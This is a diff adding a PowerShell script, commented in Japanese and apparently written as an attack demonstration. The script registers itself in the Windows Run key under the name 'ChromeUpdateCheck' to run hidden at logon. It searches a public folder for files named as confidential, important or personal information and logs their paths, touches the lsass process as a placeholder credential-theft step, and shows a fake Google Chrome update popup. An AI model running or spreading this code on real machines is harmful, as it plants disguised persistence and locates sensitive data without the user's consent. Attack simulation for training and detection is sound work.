@@ -1,0 +1,42 @@
+# --- 設定 ---
+$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$regName = "ChromeUpdateCheck"
+$OutputPath = "C:\Users\Public\detected_files.csv"
+$SearchPath = "C:\Users\Public"
+$Keywords = @("*機密*", "*重要*", "*個人情報*")
+$Extensions = @("*.docx", "*.xlsx", "*.txt")
+
+# 自身のフルパスを取得（永続化に使用）
+$exePath = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
+
+# --- STEP 1: 永続化 (Runキー登録) ---
+# 自身のEXEを起動時に実行するようレジストリに登録
+New-ItemProperty -Path $regKey -Name $regName -PropertyType String -Value "powershell.exe -WindowStyle Hidden -Command `"$exePath`"" -Force
+
+# --- STEP 2: Reconnaissance (Data Discovery) ---
+$Results = @()
+foreach ($keyword in $Keywords) {
+    foreach ($ext in $Extensions) {
+        $files = Get-ChildItem -Path $SearchPath -Include "$keyword$ext" -Recurse -ErrorAction SilentlyContinue
+        foreach ($file in $files) {
+            $Results += [PSCustomObject]@{
+                "ファイル名" = $file.Name; "検索ワード" = $keyword; "パス" = $file.FullName
+            }
+        }
+    }
+}
+if ($Results.Count -gt 0) {
+    $Results | Export-Csv -Path $OutputPath -Encoding UTF8 -NoTypeInformation
+}
+
+# --- STEP 3: Credential Access (Dummy) ---
+try {
+    $lsass = Get-Process lsass -ErrorAction Stop
+} catch { }
+
+# --- STEP 4: 実行完了後の対話（デモ用） ---
+$wshell = New-Object -ComObject Wscript.Shell
+$wshell.Popup("Google Chromeの更新が完了しました。", 0, "Google Update", 64)
+
+# クリーンアップ（デモ終了後に痕跡を消す場合）
+# Remove-ItemProperty -Path $regKey -Name $regName -ErrorAction SilentlyContinue
